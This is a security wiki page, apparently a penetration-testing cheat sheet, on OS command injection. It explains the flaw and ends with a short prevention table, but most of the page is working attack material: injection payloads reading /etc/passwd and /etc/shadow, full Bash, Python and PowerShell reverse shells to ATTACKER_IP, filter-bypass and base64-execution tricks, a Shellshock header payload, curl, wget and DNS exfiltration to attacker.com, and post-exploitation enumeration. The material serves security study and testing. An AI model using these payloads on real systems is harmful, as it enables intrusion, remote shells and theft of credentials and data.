---
title: Command Injection
---

# Command Injection

## Fundamentals

Command injection is a vulnerability that allows attackers to execute arbitrary operating system commands on a vulnerable application's host server. 

Command injection (CWE-78) occurs when an application passes **unsanitized user-controlled input directly to an OS shell**. The attacker's input breaks out of the intended command and appends or substitutes a new one.

**How it works:**

```
App intends: ping <user_input>
User supplies: 127.0.0.1; whoami
Shell executes: ping 127.0.0.1 AND whoami
```

### Vulnerable Functions by Language

| Language | Vulnerable Functions |
| --- | --- |
| **PHP** | `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, backtick ``` |
| **Python** | `os.system()`, `subprocess.call()` (with `shell=True`), `os.popen()` |
| **Node.js** | `exec()`, `execSync()`, `spawn()` (with `shell: true`) |
| **Java** | `Runtime.exec()`, `ProcessBuilder` with unsanitized input |
| **Ruby** | `exec()`, `system()`, backtick operator, `open()` |

> ⚠️ `shell=True` / `shell: true` is the most dangerous flag — always flag it during code review.
> 

### **Common Injection Operators:**

| **Operator** | **Description** | **Example** |
| --- | --- | --- |
| ; | Command separator | **`127.0.0.1; whoami`** |
| & | Background operator | **`127.0.0.1 & whoami`** |
| && | AND operator | **`127.0.0.1 && whoami`** |
| | | PIPE operator | **`127.0.0.1 | whoami`** |
| || | OR operator | **`127.0.0.1 || whoami`** |
| `` | Command substitution | **`127.0.0.1`** whoami`` |
| $() | Command substitution | **`127.0.0.1 $(whoami)`** |

## Attack Surface

Common locations to look for command injection:

| Entry Point | Example |
| --- | --- |
| **Web form fields** | Search boxes, ping/traceroute tools, IP lookup forms |
| **URL parameters** | `?host=127.0.0.1`, `?file=report.pdf` |
| **HTTP headers** | `User-Agent`, `X-Forwarded-For`, `Referer` |
| **File uploads** | Malicious filename: `file.jpg; rm -rf /` |
| **API endpoints** | JSON body parameters passed to shell commands |
| **Email/username fields** | If used in system-level operations (mail, finger) |
| **Server-side processing** | Image/video conversion tools, PDF generators, DNS lookups |

## **Exploitation Payloads**

### **Linux/Unix Payloads:**

```
; cat /etc/passwd
& uname -a
| id
`ls -la`
$(cat /etc/shadow)
```

### **Windows Payloads:**

```
& whoami
&& ipconfig /all
| net user
```

### **Reverse Shells:**

### **Bash:**

```
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

### **Python:**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### **PowerShell:**

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## **Bypassing Filters**

### **Character Obfuscation:**

```
%0a (newline)
%0d (carriage return)
%3B (;)
%26 (&)
%7C (|)
%20 or %09 (space/tab)
```

### **Space Alternatives:**

```
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

### Input redirection

```
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242
```

### ANSI-C Quoting

```
X=$'uname\x20-a'&&$X
```

### Using Tab instead of Space

```
;ls%09-al%09/home
```

### Windows - `%VARIABLE:~start,length%:` : syntax used for substring operations on environment variables.

```
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

### **Case Manipulation:**

```
WhOaMi
$(tr "[a-z]" "[A-Z]"<<<"whoami")
```

### **Encoding:**

```
echo "d2hvYW1p" | base64 -d | bash
echo "77686F616D69" | xxd -r -p | bash
```

### **Bypass With A Line Return**

Commands can also be run in sequence with newlines

```
original_cmd_by_server
ls
```

### **Bypass With Backslash Newline**

- Commands can be broken into parts by using backslash followed by a newline
    
    ```
    $ cat /et\
    c/pa\
    sswd
    ```
    
- URL encoded form would look like this:
    
    ```
    cat%20/et%5C%0Ac/pa%5C%0Asswd
    ```
    

### **Bypass With Tilde Expansion**

```
echo ~+
echo ~-
```

### **Bypass With Brace Expansion**

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

## Advanced Attack Scenarios

### 1. Environment Fingerprinting (Linux vs Windows)

Before exploitation, detect the OS to use the correct payload:

```bash
# Linux indicator
; uname -a

# Windows indicator
& ver

# Dual-OS safe check (semicolon works on Linux, & on Windows)
127.0.0.1 ; uname -a & ver
```

### 2. Shellshock (CVE-2014-6271) — Header-based RCE

If the target runs bash < 4.3 and passes HTTP headers to shell scripts:

```bash
User-Agent: () { :; }; /bin/bash -c 'id'
Referer: () { :; }; /bin/bash -c 'curl <http://attacker.com/$(whoami)>'
```

### 3. Argument Injection (Without Shell Metacharacters)

When the application uses `exec()` without a shell but passes user input as arguments:

```bash
# ffmpeg argument injection
ffmpeg -i "<http://attacker.com/file.m3u8>"

# curl argument injection
curl --config /etc/passwd

# git clone argument injection
git clone --upload-pack=whoami repo
```

> These bypass shell metacharacter filters because no `;`, `|`, or `&` is needed.
> 

### 4. RCE → Privilege Escalation Chain

After achieving command injection:

```bash
# Check sudo permissions without password
sudo -l

# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Check writable cron jobs
ls -la /etc/cron*
cat /etc/crontab
```

### 5. Exfiltration Over OOB Channels

When output is not reflected in the HTTP response (blind):

```bash
# DNS exfiltration (Burp Collaborator / interactsh)
; nslookup $(whoami).COLLABORATOR_HOST
| dig $(cat /etc/passwd | base64 | tr -d '\n' | cut -c1-50).COLLABORATOR_HOST

# HTTP exfiltration
& curl -X POST -d "$(cat /etc/passwd)" <http://attacker.com/collect>
& wget -q -O /dev/null --post-data="$(id)" <http://attacker.com/collect>
```

## Detection Techniques

### A. Manual Detection

#### (i). Basic Detection

**Objective:** Verify whether user input is executed as a system command.

```bash
; echo vulnerable
& echo vulnerable
| echo vulnerable
`echo vulnerable`
$(echo vulnerable)
```

#### (ii). Time-Based Detection (Blind)

**Objective:** Detect command execution by observing response delays when output is not visible.

```bash
; sleep 5
& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
```

#### (iii). Out-of-Band (OOB) Detection

**Objective:** Confirm command execution by triggering an external DNS or HTTP request to an attacker-controlled server.

```bash
; nslookup $(whoami).attacker.com
& curl <http://attacker.com/$(whoami)>
| wget <http://attacker.com/$(id)>
```

#### (iv). DNS Exfiltration

**Objective:** Exfiltrate sensitive data over DNS when direct command output is unavailable.

```bash
; nslookup $(whoami).attacker.com
| dig `cat /etc/passwd | base64`.attacker.com
```

### B. Automated Detection

| **Tool** | **Usage** |
| --- | --- |
| **Burp Suite Professional** | Detects command injection using Active Scanner and supports manual verification with Repeater and Intruder. |
| **OWASP ZAP** | Performs automated active scans to identify OS command injection vulnerabilities. |
| **Nuclei** | Scans applications using community-maintained command injection templates for fast, large-scale detection. |
| **Commix** | Automatically detects and exploits OS command injection vulnerabilities, including blind and OOB techniques. |
| **Metasploit Framework** | Uses auxiliary and exploit modules to validate and test command injection vulnerabilities. |

## Test Cases

| Scenario | Payload | Expected Outcome |
| --- | --- | --- |
| Basic injection via separator | `127.0.0.1; whoami` | Output of `whoami` visible in response |
| AND operator | `127.0.0.1 && id` | `id` output appended to response |
| Pipe operator | `127.0.0.1 | cat /etc/passwd` | Passwd file contents in response |
| Time-based blind | `127.0.0.1; sleep 5` | 5 second response delay |
| OOB blind | `127.0.0.1; nslookup attacker.com` | DNS request arrives at Collaborator |
| Space filter bypass | `127.0.0.1;{cat,/etc/passwd}` | Passwd returned despite space filter |
| Encoding bypass | `echo "d2hvYW1p" | base64 -d | bash` | `whoami` executed via base64 decode |
| Windows injection | `127.0.0.1 & whoami` | Windows username returned |
| Newline bypass | `127.0.0.1%0awhoami` | `whoami` output returned |
| Backtick substitution | `127.0.0.1`id`` | `id` output injected into result |

## Impact

- **Remote Code Execution (RCE)** — Full control over the server via shell commands.
- **Data Exfiltration** — Read `/etc/passwd`, `.env`, credentials, keys.
- **Lateral Movement** — Use compromised host as pivot to internal network.
- **Privilege Escalation** — Chain with SUID binaries, sudo misconfigs for root.
- **Denial of Service** — `rm -rf /`, `fork bomb`, disk fill via large file write.
- **Persistence** — Add SSH key, cron job, or backdoor user account.
- **Cloud Credential Theft** — Read `http://169.254.169.254/` for AWS/GCP tokens.

## **Tools**

| Tool | Usage |
| --- | --- |
| **Burp Suite** (Repeater, Intruder) | Manual testing, fuzzing injection points |
| **Commix** | Automated command injection detection and exploitation |
| **Metasploit** | `exploit/multi/http/command_injection` module |
| **OWASP ZAP** | Active scanning for command injection |
| **Interactsh / Burp Collaborator** | OOB/DNS exfiltration listener |
| **pwncat / netcat** | Receive and stabilize reverse shell connections |

## Prevention Technique

| **Prevention Measure** | **Description** |
| --- | --- |
| **Avoid Shell Invocation** | Use native APIs instead of executing shell commands whenever possible. |
| **Parameterize Commands** | Pass command arguments separately rather than concatenating user input into command strings. |
| **Validate & Allowlist Input** | Accept only expected input formats, values, or characters; never trust user input. |
| **Avoid `shell=True`** | Execute programs directly without invoking a shell to eliminate many injection vectors. |
| **Principle of Least Privilege** | Run applications with the minimum permissions required to reduce the impact of a successful attack. |
| **Security Testing** | Perform code reviews, SAST/DAST, and penetration testing to identify and fix command injection vulnerabilities early. |

## Good To Read

- **HackerOne Hacktivity** — Search `"command injection"` or `"RCE"` for disclosed reports.
    - https://hackerone.com/reports/661959
    - https://hackerone.com/reports/294462
    - https://hackerone.com/reports/690010
- **PortSwigger Web Security Academy** — OS Command Injection lab track.
- **Bugcrowd VRT** — Remote Code Execution > Command Injection for severity guidance.

## References

- [https://owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [https://cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html)
- [https://book.hacktricks.wiki/en/pentesting-web/command-injection.html](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://gtfobins.github.io/](https://gtfobins.github.io/)

[Command Injection Cyber Wiki (1)](https://app.notion.com/p/Command-Injection-Cyber-Wiki-1-36847a46cb0380649f02ca5b0de8fe07?pvs=21)